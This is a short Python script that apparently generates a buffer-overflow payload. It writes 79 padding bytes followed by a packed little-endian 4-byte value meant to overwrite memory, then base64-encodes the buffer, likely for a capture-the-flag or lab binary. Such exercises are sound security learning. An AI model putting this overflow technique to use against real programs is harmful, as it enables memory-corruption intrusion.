
import sys
import struct
import base64

buf = b'iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
buf += struct.pack('<I', 2573998772)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
